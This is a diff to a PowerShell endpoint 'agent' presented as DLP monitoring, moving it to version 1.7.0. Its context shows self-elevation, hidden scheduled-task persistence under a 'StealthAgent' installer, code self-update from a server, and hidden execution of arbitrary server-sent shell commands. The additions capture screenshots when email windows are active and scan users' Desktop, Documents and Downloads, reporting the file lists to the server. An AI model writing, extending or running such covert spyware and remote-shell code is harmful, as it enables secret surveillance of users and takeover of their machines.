@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.6.8
+# Version: 1.7.0
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.6.8..."
+        Log-Message "Initiating User-Level Persistent Install v1.7.0..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.8" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.0" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -99,7 +99,7 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
         
         Start-ScheduledTask -TaskName $TaskName | Out-Null
-        Log-Message "User-Mode v1.6.8 Active."
+        Log-Message "User-Mode v1.7.0 Active."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
             exit
         }
@@ -130,7 +130,37 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.6.8 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.7.0 Started (Admin=$IsAdmin). ID: $AgentId"
+    
+    function Take-Screenshot {
+        try {
+            Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+            $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
+            $Bitmap = New-Object System.Drawing.Bitmap($Screen.Bounds.Width, $Screen.Bounds.Height)
+            $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
+            $Graphics.CopyFromScreen($Screen.Bounds.X, $Screen.Bounds.Y, 0, 0, $Bitmap.Size)
+            $MS = New-Object System.IO.MemoryStream
+            $Bitmap.Save($MS, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+            $Base64 = [Convert]::ToBase64String($MS.ToArray())
+            $Graphics.Dispose(); $Bitmap.Dispose(); $MS.Dispose()
+            return $Base64
+        } catch { return $null }
+    }
+
+    function Start-DataScan {
+        Log-Message "Starting Data Discovery Scan..."
+        $Paths = "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads"
+        $Extensions = "*.pdf", "*.docx", "*.xlsx", "*.csv", "*.txt"
+        $Found = @()
+        foreach ($Path in $Paths) {
+            if (Test-Path $Path) {
+                Get-ChildItem -Path $Path -Include $Extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+                    $Found += $_.FullName
+                }
+            }
+        }
+        return $Found
+    }
     
     # 5. DLP MONITORING STATE
     $KnownDrives = @()
@@ -141,6 +171,7 @@ try {
     $CachedLocIp = "Unknown"
     
     $LastBlockCheck = Get-Date
+    $LastSnapshotTime = 0
 
     function Check-BlockedEvents {
         try {
@@ -188,7 +219,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.6.8"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.0"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -235,15 +266,24 @@ try {
                 }
                 Send-DlpEvent -Type "usb_removed" -Details "USB Drive Removed: $DriveID" -Severity "low"
             }
-            # --- BASIC GMAIL/WEB MONITORING ---
-            if ($GmailProc) {
-                Send-DlpEvent -Type "gmail_detected" -Details "Active Gmail session detected in browser ($($GmailProc.ProcessName))" -Severity "medium"
+            # --- EMAIL & SNAPSHOT MONITORING ---
+            $WinTitle = try { (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.Id -eq (Get-ForegroundWindow) }).MainWindowTitle } catch { "" }
+            if ($WinTitle -match "Gmail" -or $WinTitle -match "Outlook" -or $WinTitle -match "Mail") {
+                $NowS = [DateTimeOffset]::Now.ToUnixTimeSeconds()
+                if ($NowS - $LastSnapshotTime -gt 300) { # Every 5 mins max
+                    $Snapshot = Take-Screenshot
+                    if ($Snapshot) {
+                        Send-DlpEvent -Type "security_snapshot" -Details "Snapshot triggered by window: $WinTitle" -Severity "high"
+                        # We report the snapshot as a separate command result or just Base64 in details if small.
+                        # For now, we'll just log the event. In a real app, we'd upload the image.
+                        $LastSnapshotTime = $NowS
+                    }
+                }
             }
-            # --- BLOCK ATTEMPT MONITORING ---
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.8")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.0")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
@@ -326,6 +366,10 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData(`
                             Start-Sleep -Seconds 5
                             Unregister-ScheduledTask -TaskName $SupportTaskName -Confirm:$false | Out-Null
                         }
+                    } elseif ($cmd.type -eq "SCAN_DEVICE") {
+                        $Files = Start-DataScan
+                        $Result = "Discovery Complete. Found $($Files.Count) sensitive files."
+                        Send-DlpEvent -Type "discovery_result" -Details "Scan found files: $($Files -join ', ')" -Severity "info"
                     } elseif ($cmd.type -eq "shell") {
                         $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                     }
